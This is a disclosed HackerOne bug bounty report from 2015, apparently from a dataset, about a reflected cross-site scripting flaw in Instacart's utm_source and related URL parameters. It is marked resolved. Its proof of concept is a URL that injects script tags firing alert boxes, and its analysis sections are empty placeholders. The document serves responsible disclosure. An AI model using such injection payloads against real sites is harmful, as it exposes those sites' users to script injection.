---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '104917'
original_report_id: '104917'
title: Cross-Site Scripting Reflected On Main Domain
weakness: Cross-site Scripting (XSS) - Generic
team_handle: instacart
created_at: '2015-12-13T07:36:00.000Z'
disclosed_at: '2016-09-30T11:15:32.821Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross-Site Scripting Reflected On Main Domain

## Metadata

- HackerOne Report ID: 104917
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: instacart
- Disclosed At: 2016-09-30T11:15:32.821Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Hi** Security Team instacart

I'm Found Have Vulnerability Cross-Site Scripting Reflected on Main Domain in Variable **utm_source**

POC
---
https://www.instacart.com/green-zebra-grocery?utm_source=>"'><script>alert(/Hussain/)</script>&utm_medium=>"'><script>alert(/XSS/)</script>&utm_campaign=>"'><script>alert(/injection/)</script>

**Img** :- http://i.imgur.com/wSn4EU7.jpg

Test :- FF - IE 


**Regards**
@Hussain

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
